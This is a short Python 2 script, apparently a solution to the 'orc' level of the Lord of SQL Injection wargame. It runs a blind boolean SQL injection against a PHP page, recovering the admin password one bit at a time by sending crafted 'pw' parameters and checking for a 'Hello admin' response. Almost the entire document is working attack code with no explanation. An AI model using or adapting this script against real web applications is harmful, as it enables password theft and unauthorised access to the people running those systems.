#-*- coding:utf-8 -*-
# made by munsiwoo
import httplib, urllib

conn = httplib.HTTPConnection('los.eagle-jump.org')
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=**session**;'
}
payload = (lambda n, m: "'||id=0x61646d696e&&substr(lpad(bin(ascii(substr(pw,%d,1))),7,0),%d,1)=1#"%(n,m))
url = '/orc_47190a4d33f675a601f8def32df2583a.php?pw='
password = bin = ''

for x in range(1, 20) : # pw length
    for y in range(1, 8) : # binary length
    	param = urllib.quote(payload(x, y))
    	conn.request('GET', url+param, '', headers)
    	response = str(conn.getresponse().read())

        if('<h2>Hello admin</h2>' in response) :
    		bin += '1'
    	else :
    		bin += '0'

    password += chr(int(bin, 2))
    bin = ''
    print 'password : '+password

print 'password : '+password
conn.close()
